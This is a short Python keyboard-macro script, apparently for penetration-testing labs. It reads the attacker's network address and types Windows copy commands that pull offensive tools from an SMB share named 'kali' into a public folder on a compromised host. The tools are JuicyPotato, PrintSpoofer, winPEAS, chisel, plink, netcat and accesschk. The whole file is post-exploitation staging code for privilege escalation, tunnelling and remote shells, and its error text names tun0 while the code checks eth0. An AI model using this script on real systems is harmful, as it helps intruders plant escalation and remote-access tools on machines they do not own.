import netifaces as ni


try:
  ni.ifaddresses('eth0')
  tun_ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

except ValueError:
  dialog.info_dialog('tun0 not found', 'Can not obtain tun0 IP. Is the device connected?')

else:
    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\accesschk.exe C:\\Users\\Public\\Documents\\accesschk.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\chisel.exe C:\\Users\\Public\\Documents\\chisel.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\icacls.exe C:\\Users\\Public\\Documents\\icacls.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\JuicyPotato.exe C:\\Users\\Public\\Documents\\JuicyPotato.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\nc.exe C:\\Users\\Public\\Documents\\nc.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\plink.exe C:\\Users\\Public\\Documents\\plink.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\PrintSpoofer.exe C:\\Users\\Public\\Documents\\PrintSpoofer.exe")
    keyboard.send_keys("<enter>")

    keyboard.send_keys("copy \\\\" + tun_ip + "\\kali\\winPEASany.exe C:\\Users\\Public\\Documents\\winPEASany.exe")
    keyboard.send_keys("<enter>")